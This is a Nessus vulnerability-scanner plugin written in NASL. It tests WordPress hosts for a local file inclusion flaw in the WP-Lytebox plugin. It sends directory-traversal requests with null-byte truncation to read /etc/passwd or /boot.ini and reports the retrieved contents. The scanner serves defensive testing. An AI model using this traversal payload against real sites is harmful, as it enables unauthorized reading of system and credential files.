#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(38925);
  script_version("$Revision: 1.2 $");

  script_bugtraq_id(35098);
  script_xref(name:"milw0rm", value:"8791");

  script_name(english:"WP-Lytebox pg Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP script that is affected by a\n",
      "local file include vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote host is running WP-Lytebox, a plugin for WordPress that\n",
      "uses Lytebox to add a lightbox functionality to HTML content.\n",
      "\n",
      "The version of WP-Lytebox installed on the remote host fails to filter\n",
      "user-supplied input to the 'pg' parameter of the 'main.php' script\n",
      "before using it to include PHP code.  Regardless of PHP's\n",
      "'register_globals' setting, an unauthenticated attacker can exploit\n",
      "this issue to view arbitrary files or possibly to execute arbitrary\n",
      "PHP code on the remote host, subject to the privileges of the web\n",
      "server user id."
    )
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Unknown at this time."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');
files = make_list(files, "license.txt");

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";
file_pats['license.txt'] = "GNU GENERAL PUBLIC LICENSE";


# Test an install.
install = get_kb_item(string("www/", port, "/wordpress"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Loop through files to look for.
  foreach file (files)
  {
    # Try to exploit the issue.
    if (file[0] == '/') traversal = crap(data:"../", length:3*9) + '..';
    else traversal = '../../../../';

    if (substr(file, strlen(file)-4) == ".txt")
      exploit = string(traversal, substr(file, 0, strlen(file)-4-1));
    else
      exploit = string(traversal, file, "%00");

    url = string(
      dir, "/wp-content/plugins/wp-lytebox/main.php?",
      "pg=", exploit
    );

    res = http_send_recv3(port:port, method:"GET", item:url);
    if (isnull(res)) exit(0);

    # There's a problem if...
    body = res[2];
    file_pat = file_pats[file];
    if (
      # we see the expected contents or...
      egrep(pattern:file_pat, string:body) ||
      # we get an error because magic_quotes was enabled or...
      string(file, "\\0.txt") >< body ||
      # we get an error claiming the file doesn't exist or...
      string(file, "): failed to open stream: No such file") >< body ||
      string(file, ") [function.include]: failed to open stream: No such file") >< body ||
      string(file, ") [<a href='function.include'>function.include</a>]: failed to open stream: No such file") >< body ||
      # we get an error about open_basedir restriction.
      string(file, ") [function.include]: failed to open stream: Operation not permitted") >< body ||
      string(file, ") [<a href='function.include'>function.include</a>]: failed to open stream: Operation not permitted") >< body ||
      string("open_basedir restriction in effect. File(", file) >< body
    )
    {
      if (report_verbosity > 0)
      {
        if (egrep(pattern:file_pat, string:body))
        {
          if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

          report = string(
            "\n",
            "Nessus was able to exploit the issue to retrieve the contents of\n",
            "'", file, "' on the remote host using the following URL :\n",
            "\n",
            "  ", build_url(port:port, qs:url), "\n"
          );
          if (report_verbosity > 1)
          {
            contents = strstr(body, "r6_c2.gif");
            contents = strstr(contents, 'valign="top">') - 'valign="top">';
            contents = strstr(contents, '\n   ') - '\n   ';
            contents = contents - strstr(contents, "   </td>");

            report += string(
              "\n",
              "Here are its contents :\n",
              "\n",
              crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
              contents,
              crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
            );
          }
        }
        else
        {
          report = string(
            "\n",
            "Nessus was able to verify the issue exists using the following \n",
            "URL :\n",
            "\n",
            "  ", build_url(port:port, qs:url), "\n"
          );
        }

        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
}
